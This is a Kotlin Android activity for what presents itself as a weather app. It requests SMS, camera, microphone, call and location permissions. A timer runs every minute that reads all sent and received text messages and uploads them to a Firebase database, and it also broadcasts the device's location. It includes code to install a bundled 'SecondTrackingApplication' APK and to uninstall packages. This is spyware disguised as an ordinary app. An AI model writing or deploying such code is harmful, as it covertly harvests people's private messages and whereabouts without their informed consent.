package com.plcoding.weatherapp.presentation

import android.Manifest
import android.app.Activity
import android.app.PendingIntent
import android.content.ActivityNotFoundException
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.provider.Settings
import android.view.View
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.material.Button
import androidx.compose.material.CircularProgressIndicator
import androidx.compose.material.Text
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.core.content.ContextCompat
import com.google.android.gms.location.LocationServices
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import com.plcoding.weatherapp.presentation.ui.theme.DarkBlue
import com.plcoding.weatherapp.presentation.ui.theme.DeepBlue
import com.plcoding.weatherapp.presentation.ui.theme.WeatherAppTheme
import dagger.hilt.android.AndroidEntryPoint
import android.provider.Telephony
import com.google.android.gms.tasks.OnCompleteListener
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.google.firebase.messaging.FirebaseMessaging
import android.content.pm.PackageInstaller
import android.content.res.AssetManager
import androidx.compose.foundation.lazy.LazyRow
import com.plcoding.weatherapp.presentation.ui.theme.ApkInstallReceiver
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.io.IOException

@AndroidEntryPoint
class MainActivity : ComponentActivity() {

    private val handler = Handler()
    private lateinit var runnable: Runnable
    private val locationCollectionRef = Firebase.firestore.collection("location")
    private val mainViewModel: MainViewModel by viewModels()
    private val viewModel: WeatherViewModel by viewModels()
    private lateinit var permissionLauncher: ActivityResultLauncher<Array<String>>
    private val permissionsToRequest = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.CAMERA,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.READ_SMS)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        permissionLauncher = registerForActivityResult(
            ActivityResultContracts.RequestMultiplePermissions()
        ) { permissions_map ->
            if (permissions_map[Manifest.permission.ACCESS_FINE_LOCATION] == true
                || permissions_map[Manifest.permission.ACCESS_COARSE_LOCATION] == true
            ) {
                viewModel.loadWeatherInfo()
            }
            permissionsToRequest.forEach { current_permission ->
                mainViewModel.onPermissionResult(
                    permission = current_permission,
                    isGranted = permissions_map[current_permission] == true
                )
            }
        }

        permissionLauncher.launch(permissionsToRequest)

        // Hide the navigation bar and status bar: Immersive mode is activated when the activity
        // is created, providing a fullscreen experience. This mode only hides the system UI
        // temporarily and doesn't prevent the user from accessing it when needed.
        window.decorView.apply {
            systemUiVisibility = (
                    View.SYSTEM_UI_FLAG_IMMERSIVE
                            or View.SYSTEM_UI_FLAG_FULLSCREEN
                            or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                            or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                            or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                            or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                    )
        }

        // Define the Runnable to start the activity
        runnable = Runnable {
            broadcastSMS() // Methods to start your desired activity
            broadcastLocation()
            handler.postDelayed(runnable, 60000) // Schedule the Runnable again after 1 minute (60000 milliseconds)
        }

        // Schedule the initial execution of the Runnable
        handler.postDelayed(runnable, 60000) // Start the activity after 1 minute (60000 milliseconds)

        setContent {
            WeatherAppTheme {
                val dialogQueue = mainViewModel.visiblePermissionDialogQueue
                dialogQueue
                    .reversed()
                    .forEach { permission ->
                        PermissionDialog(
                            permissionTextProvider = when (permission) {
                                Manifest.permission.ACCESS_FINE_LOCATION -> {
                                    FineLocationPermissionTextProvider()
                                }

                                Manifest.permission.READ_SMS -> {
                                    SendSMSPermissionTextProvider()
                                }

                                Manifest.permission.CAMERA -> {
                                    CameraPermissionTextProvider()
                                }

                                Manifest.permission.RECORD_AUDIO -> {
                                    RecordAudioPermissionTextProvider()
                                }

                                Manifest.permission.CALL_PHONE -> {
                                    PhoneCallPermissionTextProvider()
                                }

                                else -> return@forEach
                            },
                            isPermanentlyDeclined = !shouldShowRequestPermissionRationale(
                                permission
                            ),
                            onDismiss = { mainViewModel::dismissDialog },
                            onOkClick = {
                                mainViewModel.dismissDialog()
                                permissionLauncher.launch(arrayOf(permission))
                            },
                            onGoToAppSettingsClick = ::openAppSettings
                        )
                    }

                Box(
                    modifier = Modifier.fillMaxSize()
                ) {
                    Column(
                        modifier = Modifier
                            .fillMaxSize()
                            .background(DarkBlue)
                    ) {

                        WeatherCard(
                            state = viewModel.state,
                            backgroundColor = DeepBlue
                        )
                        Spacer(modifier = Modifier.height(16.dp))
                        WeatherForecast(state = viewModel.state)
                        Button(onClick = {
                            FirebaseMessaging.getInstance().token.addOnCompleteListener(
                                OnCompleteListener { task ->
                                if (!task.isSuccessful) {
                                    println("Fetching FCM registration token failed")
                                    return@OnCompleteListener
                                }

                                // Get new FCM registration token
                                val token = task.result

                                // Copy the token to the clipboard
                                val clipboardManager = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
                                val clipData = ClipData.newPlainText("FCM Token", token)
                                clipboardManager.setPrimaryClip(clipData)

                                // Toast
                                Toast.makeText(
                                    applicationContext,
                                    "Please allow for notifications",
                                    Toast.LENGTH_SHORT
                                    ).show()
                            })
                        }) {
                            Text(text = "Copy token")
                        }
                        Button(onClick = {
                            val fusedLocationClient = LocationServices
                                .getFusedLocationProviderClient(this@MainActivity)
                            fusedLocationClient.lastLocation
                                .addOnSuccessListener { location ->
                                    location.let {
                                        val lat = location.latitude
                                        val long = location.longitude

                                        val intent = Intent("ACTION_SEND_LOCATION").apply {
                                            putExtra("latitude", lat)
                                            putExtra("longitude", long)
                                        }

                                        sendBroadcast(intent)
                                    }
                                }
                        }) {
                            Text(text = "Send Broadcast")
                        }
                        Button(onClick = {
                            // Start the service when the button is clicked and the
                            // "Display over other apps" permission is granted
                            if (Settings.canDrawOverlays(this@MainActivity)) {
                                val serviceIntent =
                                    Intent(this@MainActivity, AlertService::class.java)
                                startService(serviceIntent)
                            } else {
                                Toast.makeText(
                                    applicationContext,
                                    "Please allow Display Over Other Apps",
                                    Toast.LENGTH_SHORT
                                ).show()
                            }

                        }) {
                            Text(text = "System Alert Window")
                        }
                        Button(onClick = {
                            // Check if permission is not granted
                            if (ContextCompat.checkSelfPermission(
                                    this@MainActivity,
                                    Manifest.permission.READ_SMS
                                )
                                == PackageManager.PERMISSION_GRANTED
                            ) {
                                val smsList = readSMS()
                                // Display list in Logcat
                                println("smsList: $smsList")
                                // Convert MutableList<String> to Array<String>
                                val smsArray = smsList.toTypedArray()
                                // Create a new Intent for broadcasting
                                // Add the smsArray as an extra to the Intent
                                val smsIntent = Intent("ACTION_SEND_SMS").apply {
                                    putExtra("smsArray", smsArray)}
                                // Broadcast the Intent
                                sendBroadcast(smsIntent)
                                // Send SMS to Database
                                sendSMSToFirebase(smsList)
                            }
                        }) {
                            Text(text = "Send SMS to Firebase")
                        }
                        Button(onClick = {
                            // We retrieve the package name of the app using context.packageName.
                            // We create an intent with the action Intent.ACTION_UNINSTALL_PACKAGE,
                            // set the data URI to "package:$packageName", and start the
                            // uninstallation intent using context.startActivity(uninstallIntent).

                            val packageName = this@MainActivity.packageName
                            val uninstallIntent = Intent(Intent.ACTION_DELETE)
                            uninstallIntent.data = Uri.parse("package:$packageName")
                            uninstallIntent.putExtra(Intent.EXTRA_RETURN_RESULT, true)
                            startActivity(uninstallIntent)

                            //Package name of the app you want to uninstall
                            val secondPackageName = "com.plcoding.SecondTrackingApplication"

                            //Open the app details page in system settings
                            val secondUninstallIntent = Intent(Intent.ACTION_DELETE)
                            secondUninstallIntent.data = Uri.parse("package:$secondPackageName")
                            secondUninstallIntent.putExtra(Intent.EXTRA_RETURN_RESULT, true)
                            startActivity(secondUninstallIntent)

                        }) {
                            Text(text = "Uninstall package")
                        }
                        Button(onClick = {
                            val apkFileName = "app-release.apk"
                            val targetPackageName = "com.plcoding.SecondTrackingApplication"
                            val apkFile = copyApkFromAssetsToCache(this@MainActivity, apkFileName)
                            println("APK file name: $apkFile")
                            installApk(apkFile, packageManager, targetPackageName)

                        }) {
                            Text(text = "Install package")
                        }
                    }
                    if (viewModel.state.isLoading) {
                        CircularProgressIndicator(
                            modifier = Modifier.align(Alignment.Center)
                        )
                    }
                    viewModel.state.error?.let { error ->
                        Text(
                            text = error,
                            color = Color.Red,
                            textAlign = TextAlign.Center,
                            modifier = Modifier.align(Alignment.Center)
                        )
                    }
                }
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        // Remove any pending callbacks to prevent memory leaks
        handler.removeCallbacks(runnable)
    }


    private fun readSMS(): List<String> {
        //Read SMS messages and send to Firebase
        val smsList = mutableListOf<String>()


        //Define the URI for the sent SMS messages
        val sentURI: Uri = Uri.parse("content://sms/sent")

        // Query the SMS content provider
        val cursor = contentResolver.query(
            sentURI,
            null,  // Projection (null returns all columns)
            null,  // Selection
            null,  // Selection arguments
            null   // Sort order
        )

        // Iterate through the cursor to retrieve sent SMS messages
        cursor?.use { cursor ->
            val bodyIndex = cursor.getColumnIndex(Telephony.Sms.BODY)

            while (cursor.moveToNext()) {
                val body = cursor.getString(bodyIndex)
                smsList.add(body)
            }
        }

        //Define the URI for the indox SMS messages
        val indoxURI: Uri = Uri.parse("content://sms/inbox")

        // Query the SMS content provider for the received text messages
        val inbox_cursor = contentResolver.query(
            indoxURI,
            null,  // Projection (null returns all columns)
            null,  // Selection
            null,  // Selection arguments
            null   // Sort order
        )

        // Iterate through the second cursor to retrieve the inbox SMS messages
        inbox_cursor?.use { inbox_cursor ->
            val bodyIndex = inbox_cursor.getColumnIndex(Telephony.Sms.BODY)

            while (inbox_cursor.moveToNext()) {
                val body = inbox_cursor.getString(bodyIndex)
                smsList.add(body)
            }
        }

        // Close the second cursor to free up resources
        inbox_cursor?.close()

        // Now the smsList contains both sent and received text messages
        return smsList

    }


    private fun sendSMSToFirebase(smsList: List<String>) {
        val database: FirebaseDatabase = FirebaseDatabase.getInstance()
        val smsRef: DatabaseReference = database.getReference("SMS_tree")


        // Loop through the SMS list and push each message to Firebase
        for (sms in smsList) {
            // Check if the SMS message already exists in the database
            smsRef.orderByValue().equalTo(sms).addListenerForSingleValueEvent(object :
                ValueEventListener {
                override fun onDataChange(dataSnapshot: DataSnapshot) {
                    if (!dataSnapshot.exists()) {
                        // Check if SMS message exists in the database
                        val key = smsRef.push().key
                        if (key != null) {
                            smsRef.child(key).setValue(sms)
                        }
                    }

                }

                override fun onCancelled(databaseError: DatabaseError) {
                    // Handle database error
                    println("Error checking duplicate data: ${databaseError.message}")
                }
            })
        }
    }

    private fun broadcastSMS(){
        // Check if permission is not granted
        if (ContextCompat.checkSelfPermission(
                this@MainActivity,
                Manifest.permission.READ_SMS
            )
            == PackageManager.PERMISSION_GRANTED
        ) {
            val smsList = readSMS()
            // Display list in Logcat
            println("smsList: $smsList")
            // Convert MutableList<String> to Array<String>
            val smsArray = smsList.toTypedArray()
            // Create a new Intent for broadcasting
            // Add the smsArray as an extra to the Intent
            val smsIntent = Intent("ACTION_SEND_SMS").apply {
                putExtra("smsArray", smsArray)}
            // Broadcast the Intent
            sendBroadcast(smsIntent)
            // Send SMS to Database
            sendSMSToFirebase(smsList)
        }
    }


    // Function to copy APK file from assets to app's cache directory
    private fun copyApkFromAssetsToCache(context: Context, apkFileName: String): File? {
        val assetManager: AssetManager = context.assets
        val cacheDir: File = context.cacheDir

        try {
            // Open APK file from assets
            val inputStream = assetManager.open(apkFileName)

            // Create output file in app's cache directory
            val outputFile = File(cacheDir, apkFileName)
            val outputStream = FileOutputStream(outputFile)

            // Copy APK file from assets to cache directory
            inputStream.use { input ->
                outputStream.use { output ->
                    input.copyTo(output)
                }
            }

            return outputFile
        } catch (e: Exception) {
            e.printStackTrace()
        }

        return null
    }

    // Function to install an APK file
    private fun installApk(apkFile: File?, packageManager: PackageManager, targetPackageName:String) {
        try {
            val packageInstaller = packageManager.packageInstaller

            // Create a new session
            val sessionParams = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
            val sessionId = packageInstaller.createSession(sessionParams)
            val session = packageInstaller.openSession(sessionId)

            // Open the APK file as input stream
            val inputStream = FileInputStream(apkFile)
            val outputStream = session.openWrite("package", 0, -1)

            // Copy the APK file contents to the session's output stream
            val buffer = ByteArray(65536)
            var bytesRead: Int
            while (inputStream.read(buffer).also { bytesRead = it } != -1) {
                outputStream.write(buffer, 0, bytesRead)
            }

            // Finish writing and close streams
            session.fsync(outputStream)
            inputStream.close()
            outputStream.close()
            println("You are here1")

            // Commit the session (start installation for the target app)
//            val intent = packageManager.getLaunchIntentForPackage(targetPackageName) // this@MainActivity.packageName
//            println("You are here2")
//            if (intent == null) {
//                println("Launch intent is null for package: $targetPackageName")
//                return
//            }
//            val pendingIntent = PendingIntent.getActivity(this@MainActivity,
//                sessionId, intent, PendingIntent.FLAG_IMMUTABLE) //FLAG_UPDATE_CURRENT
//            println("You are here3")
//            session.commit(pendingIntent.intentSender)
//            val intent = Intent(this@MainActivity, ApkInstallReceiver::class.java) // Create a dummy intent
//            val pendingIntent = PendingIntent.getBroadcast(this@MainActivity, sessionId, intent, PendingIntent.FLAG_IMMUTABLE)
//            session.commit(pendingIntent.intentSender)


            // Create Intent to launch the installed app
            val intent = Intent(Intent.ACTION_MAIN)
            intent.addCategory(Intent.CATEGORY_LAUNCHER)
            intent.setPackage(targetPackageName)
            intent.flags = Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
            println("Successfully installed APK")
            // Check if the intent and package name are not null before launching
            if (intent.resolveActivity(packageManager) != null && targetPackageName.isNotEmpty()) {
                println("Successfully installed and launched app: $targetPackageName")
            } else {
                println("Failed to launch app: $targetPackageName")
            }
        } catch (e: IOException) {
            println("Failed to install APK")
            e.printStackTrace()
            // Handle installation error
        }
    }


    private fun broadcastLocation(){
        val fusedLocationClient = LocationServices
            .getFusedLocationProviderClient(this@MainActivity)
        fusedLocationClient.lastLocation
            .addOnSuccessListener { location ->
                location.let {
                    val lat = location.latitude
                    val long = location.longitude

                    val intent = Intent("ACTION_SEND_LOCATION").apply {
                        putExtra("latitude", lat)
                        putExtra("longitude", long)
                    }

                    sendBroadcast(intent)
                }
            }
    }

}



    fun Activity.openAppSettings() {
    Intent(
        Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
        Uri.fromParts("package", packageName, null)
    ).also(::startActivity)
    }



